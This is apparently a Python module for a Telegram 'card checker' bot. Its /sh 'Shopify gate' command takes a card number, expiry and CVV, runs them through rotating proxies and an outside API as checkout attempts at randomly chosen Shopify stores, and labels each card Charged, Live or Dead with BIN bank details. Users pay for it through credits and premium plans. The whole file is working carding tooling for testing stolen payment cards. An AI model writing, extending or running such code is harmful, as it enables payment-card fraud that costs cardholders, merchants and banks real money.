import aiohttp
import asyncio
import time
import random
from html import escape
from telegram import Update, LinkPreviewOptions
from telegram.ext import CommandHandler, ContextTypes
from config import (
    get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT,
    CHANNEL_LINK, tg_emoji,
    CARD_EMOJI_ID, USER_EMOJI_ID, TIME_EMOJI_ID, DEV_EMOJI_ID, PRO_EMOJI_ID,
    PROG_LIVE_EMOJI_ID, PROG_DEAD_EMOJI_ID, DECLINED_EMOJI_ID,
    PROG_PROGRESS_EMOJI_ID, DEV_LINK,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GOSHOPI SHOPIFY GATE  — uses goshopi.up.railway.app/shopii
# Sites loaded from sites.txt (one full URL per line).
# Proxies loaded from px.txt (one proxy per line).
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GOSHOPI_URL   = "https://goshopi.up.railway.app/shopii"
FALLBACK_SITE = "aloracosmetics.myshopify.com"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EMOJI IDs — taken verbatim from msh.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LIVE_EMOJI_ID          = "4958610528588008305"
PROG_CHARGED_EMOJI_ID  = "5427168083074628963"
PROG_ERRORS_EMOJI_ID   = "4956611513369494230"

# Pool of charged emoji IDs — a random one is shown per charged hit (from msh.py)
CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]


def get_random_charged_emoji() -> str:
    """Return a random emoji ID from the charged pool (mirrors msh.py)."""
    return random.choice(CHARGED_EMOJI_IDS)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE / PROXY LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_sites() -> list:
    """Load target Shopify sites from sites.txt (full URLs or bare domains)."""
    try:
        with open("sites.txt", "r") as f:
            sites = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return sites if sites else [f"https://{FALLBACK_SITE}"]
    except FileNotFoundError:
        return [f"https://{FALLBACK_SITE}"]


def load_proxies() -> list:
    """Load proxies from px.txt."""
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        return []


def _clean_site(url: str) -> str:
    """Strip protocol, www., and trailing slashes from a URL → bare domain."""
    s = url.strip()
    for prefix in ("https://", "http://"):
        if s.startswith(prefix):
            s = s[len(prefix):]
    if s.startswith("www."):
        s = s[4:]
    return s.rstrip("/")


def _readable_resp(data: dict) -> str:
    """Extract the most meaningful response field from the API JSON dict."""
    for key in ("Response", "response", "value", "message", "category", "status", "detail", "error"):
        val = data.get(key)
        if val and str(val).strip() not in ("", "null", "None"):
            return str(val).strip()
    raw = str(data)
    return raw[:200] if len(raw) > 200 else raw


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RETRY / DECLINED KEYWORD LISTS — copied verbatim from msh.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
    'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'no available products found', 'could not extract receiptid',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'INVENTORY_FAILURE',
    'products.json', 'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'store incompatible', 'extract signedHandles', 'missing receiptId',
    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]


def classify_response(message: str) -> str:
    """
    Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR.
    Copied verbatim from msh.py — 3DS_REQUIRED / INCORRECT_CVV /
    INSUFFICIENT_FUNDS all count as Live.
    """
    mu = message.upper()
    ml = message.lower()

    # Charged / order paid
    if "ORDER_PAID" in mu or "CHARGED" in mu:
        return "CHARGED"

    # 3DS — counted under Live, tracked separately
    if "3DS_REQUIRED" in mu:
        return "TDS"

    # Live hits: INSUFFICIENT_FUNDS / INCORRECT_CVV / INCORRECT_CVC / INCORRECT_ZIP
    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
        return "LIVE"

    if "GENERIC_ERROR" in mu:
        return "DEAD"

    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # Retry / site errors — credit is refunded by caller
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    return "ERROR"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def call_shopii(
    session: aiohttp.ClientSession, card: str, site: str, proxy: str | None
) -> dict:
    """Call the goshopi API and return the full parsed JSON dict (or an error dict)."""
    params: dict = {"cc": card, "site": site}
    if proxy:
        params["proxy"] = proxy
    try:
        async with session.get(
            GOSHOPI_URL, params=params,
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT)
        ) as resp:
            try:
                return await resp.json(content_type=None)
            except Exception:
                raw = await resp.text()
                return {"Response": raw, "_raw_text": True}
    except asyncio.TimeoutError:
        raise
    except Exception as e:
        return {"Response": f"CONNECTION_ERROR: {e}", "_error": True}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PLAN HELPERS  (local — avoids circular import with main)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL", "expires": 0,
            "pre_premium_credits": 0,
        }
    return context.bot_data["user_data"][uid]


def _is_premium(ud: dict) -> bool:
    plan = ud.get("plan", "TRIAL").upper()
    if plan == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True


async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked", "restricted"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── Maintenance / gate off ──────────────────────────
    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(
            "⚠️ Bot is under maintenance. Try again later.", parse_mode="HTML"
        )
        return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ <b>Shopify gate is currently OFF.</b>", parse_mode="HTML"
        )
        return

    # ── Force-sub check ─────────────────────────────────
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        from telegram import InlineKeyboardButton, InlineKeyboardMarkup
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>Join Required</b>\n──────────\nJoin our channel & group to use this bot.",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML"
        )
        return

    # ── Parse card ──────────────────────────────────────
    card_raw = None
    if context.args:
        card_raw = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt:
            card_raw = txt.split()[0]

    if not card_raw or card_raw.count("|") < 3:
        await update.message.reply_text(
            f"<b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>\n"
            f"<b>Example:</b> <code>/sh 4111111111111111|12|2026|123</code>",
            parse_mode="HTML"
        )
        return

    # ── Credits / cooldown ──────────────────────────────
    ud      = _get_user_data(user.id, context)
    premium = _is_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>❌ No Credits</b>\n──────────\nYou have 0 credits left.\n"
                "Use /rm to redeem a code or /plan to upgrade.\n──────────",
                parse_mode="HTML"
            )
            return

        cooldown_store = context.bot_data.setdefault("cooldown_store", {})
        last_check     = cooldown_store.get(user.id, 0)
        remaining      = 25 - (time.time() - last_check)
        if remaining > 0:
            await update.message.reply_text(
                f"<b>⏳ Cooldown</b>\n──────────\nWait <b>{remaining:.1f}s</b> before your next check.\n──────────",
                parse_mode="HTML"
            )
            return
        cooldown_store[user.id] = time.time()
        ud["credits"] = ud.get("credits", 1) - 1

    # ── Pick site and proxy ─────────────────────────────
    sites      = load_sites()
    proxies    = load_proxies()
    raw_site   = random.choice(sites)
    clean_site = _clean_site(raw_site)
    proxy      = random.choice(proxies) if proxies else None

    bin_num = card_raw.replace("|", "").replace(" ", "")[:6]

    msg = await update.message.reply_text(
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> '
        f'Checking Shopify...</b>',
        parse_mode="HTML"
    )
    start_time = time.time()
    uname      = f"@{user.username}" if user.username else user.first_name or "User"
    plan       = ud.get("plan", "TRIAL")
    _lp        = LinkPreviewOptions(is_disabled=True)

    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            data, bin_data = await asyncio.gather(
                call_shopii(session, card_raw, clean_site, proxy),
                get_bin_info(bin_num),
                return_exceptions=True,
            )

        if isinstance(data, BaseException):
            raise data
        if isinstance(bin_data, BaseException):
            bin_data = {}

        # ── Extract all important fields from the API response ──
        if not isinstance(data, dict):
            data = {}

        resp_text    = _readable_resp(data)
        api_price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
        api_currency = str(data.get("Currency", data.get("currency", "USD"))).strip()
        api_gateway  = str(data.get("Gateway",  data.get("gateway",  "Shopify Payments"))).strip()

        verdict = classify_response(resp_text)

        # ── BIN info line ───────────────────────────────
        bin_txt = "N/A"
        if isinstance(bin_data, dict) and bin_data:
            scheme  = str(bin_data.get("scheme",  "N/A")).upper()
            bank    = bin_data.get("bank",    "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{scheme} - {bank} - {flag} {country}".strip(" -")

        time_taken = f"{time.time() - start_time:.2f}"

        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        # VERDICT → STATUS LINE + FULL MESSAGE
        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        if verdict == "CHARGED":
            # Random emoji from pool — same as msh.py
            charged_eid = get_random_charged_emoji()
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Charged '
                f'<tg-emoji emoji-id="{charged_eid}">💎</tg-emoji></b>'
            )
            # Show price + currency prominently for charged cards
            gate_line = (
                f'<b>Gᴀᴛᴇ ➺ {escape(api_gateway)} | '
                f'{escape(api_price)} {escape(api_currency)}</b>'
            )
            ud["approved_checks"] = ud.get("approved_checks", 0) + 1

        elif verdict == "TDS":
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
                f'<tg-emoji emoji-id="{LIVE_EMOJI_ID}">✅</tg-emoji> [3DS]</b>'
            )
            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
            ud["approved_checks"] = ud.get("approved_checks", 0) + 1

        elif verdict == "LIVE":
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
                f'<tg-emoji emoji-id="{LIVE_EMOJI_ID}">✅</tg-emoji></b>'
            )
            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
            ud["approved_checks"] = ud.get("approved_checks", 0) + 1

        elif verdict == "DEAD":
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Dead '
                f'<tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji></b>'
            )
            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1

        elif verdict == "RETRY":
            # Site / proxy error — refund credit
            if not premium:
                ud["credits"] = ud.get("credits", 0) + 1
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Retry '
                f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
            )
            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1

        else:  # ERROR
            # Unknown response — refund credit
            if not premium:
                ud["credits"] = ud.get("credits", 0) + 1
            status_line = (
                f'<b><a href="{CHANNEL_LINK}">[❆]</a> Error '
                f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>'
            )
            gate_line = f'<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 0$</b>'
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1

        # ── Full result message ─────────────────────────
        text = (
            f"{status_line}\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>💳 <code>{escape(card_raw)}</code></b>\n"
            f"{gate_line}\n"
            f"<b>Rᴀᴡ  ➺ {escape(resp_text)}</b>\n"
            f"<b>Iɴꜰᴏ ➺ {bin_txt}</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⏱ {time_taken}s</b>\n"
            f"<b>👤 {escape(uname)}</b>\n"
            f"<b>⚡ Batman ⭐</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f'<b>📢 <a href="{CHANNEL_LINK}">@Batcardchk</a></b>'
        )

        # ── Update user stats ───────────────────────────
        ud["total_checks"] = ud.get("total_checks", 0) + 1
        ud["last_gate"]    = "Shopify | 0$"
        ud["last_card"]    = card_raw[:6] + "xxxxxxxxxx"

        await msg.edit_text(
            text, parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=_lp,
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        time_taken = f"{time.time() - start_time:.2f}"
        await msg.edit_text(
            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Timeout '
            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⏱</tg-emoji></b>\n\n'
            f'<b><code>{escape(card_raw)}</code></b>\n'
            f'<b>Gate ➳ Shopify | 0$</b>\n'
            f'<b>──────────</b>\n'
            f'<b>Rᴀᴡ ➳ Request Timed Out</b>\n'
            f'<b>──────────</b>\n'
            f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_taken}s</b>',
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )

    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        time_taken = f"{time.time() - start_time:.2f}"
        await msg.edit_text(
            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Error '
            f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n\n'
            f'<b><code>{escape(card_raw)}</code></b>\n'
            f'<b>Gate ➳ Shopify | 0$</b>\n'
            f'<b>──────────</b>\n'
            f'<b>Rᴀᴡ ➳ {escape(str(e)[:150])}</b>\n'
            f'<b>──────────</b>\n'
            f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_taken}s</b>',
            parse_mode="HTML",
            reply_markup=kb_result(premium),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )


def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)
